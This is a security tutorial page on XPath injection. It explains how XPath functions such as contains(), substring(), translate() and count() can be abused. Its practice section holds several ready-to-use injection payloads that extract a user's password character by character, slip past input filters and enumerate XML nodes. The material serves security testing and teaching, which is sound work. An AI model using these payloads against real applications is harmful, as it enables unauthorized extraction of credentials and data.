---
title: Exploit XPath Functions for XML Data Extraction
description: Learn to exploit XPath functions for extracting and manipulating XML
  data using injection techniques.
keywords:
- XPath functions
- XML data extraction
- XPath injection
- web application exploits
- substring function
- contains function
- normalize-space
- security testing
---

# XPath Functions Exploitation

## Context

    The purpose of this article is to demonstrate practical exploitation of XPath functions to extract, infer, or manipulate XML data via injection. This discussion assumes you have a working knowledge of XPath syntax, XML structure, web application architecture, and XPath injection techniques.

## Theory

### Abusing XPath Functions in Injection Contexts

    XPath functions are designed to process, filter, or transform XML data within queries. When an application exposes user input to XPath queries without proper sanitization, it becomes vulnerable to function-based exploitation. By crafting malicious queries, attackers can manipulate the query logic to leak or infer sensitive data stored in XML documents.

### Key XPath Functions for Exploitation

    - **contains(), starts-with(), ends-with()** validate whether targeted strings contain specific fragments for boolean probing.
    - **normalize-space(), translate()** normalize or re-map data to bypass filters and harmonize comparisons.
    - **concat()** merges fragments to build obfuscated or multi-character comparisons.
    - **count(), position()** enumerate nodes and reveal relative ordering.
    - **string-length(), substring(), substring-before(), substring-after()** drive character-by-character extraction and structural mapping.

### Function-Based Data Extraction Logic

    - Use boolean functions to infer data through true or false query responses.
    - Employ string manipulation functions to extract specific characters or substrings, piece by piece.
    - Combine functions to bypass input validation or obfuscate injected payloads, hiding them from simple detection measures.

## Practice

### Extracting Data with contains() and substring()

    - Confirm whether the first user's password contains a character:
        ```xpath
        ' or contains(/users/user[1]/password,'a') or '1'='0
        ```
    - Identify a specific character position:
        ```xpath
        ' or substring(/users/user[1]/password,1,1)='a' or '1'='0
        ```
    - Outcome: boolean differences disclose the characters comprising the password.

### Bypassing Filters with normalize-space() and translate()

    - Strip superfluous whitespace before comparison:
        ```xpath
        ' or normalize-space(/users/user[1]/username)='admin' or '1'='0
        ```
    - Lowercase the username dynamically:
        ```xpath
        ' or translate(/users/user[1]/username,'ABCDEFGHIJKLMNOPQRSTUVWXYZ','abcdefghijklmnopqrstuvwxyz')='admin' or '1'='0
        ```
    - Outcome: filter normalization fails to block the payload because the function transforms the data server-side.

### Enumerating Nodes with count() and position()

    - Count available nodes:
        ```xpath
        ' or count(/users/user)=2 or '1'='0
        ```
    - Reference a specific position:
        ```xpath
        ' or /users/user[position()=1] or '1'='0
        ```
    - Outcome: node enumeration reveals structure for later targeted extraction.

### Combining concat() and substring() for Obfuscated Extraction

    - Fetch composite fragments within a single predicate:
        ```xpath
        ' or concat(substring(/users/user[1]/password,1,1),substring(/users/user[1]/password,2,1))='ab' or '1'='0
        ```
    - Outcome: concatenated checks disclose multi-character sequences while bypassing filters tuned for single-character probes.

## Tools

    - **Burp Suite**
    - **OWASP ZAP**
    - **curl**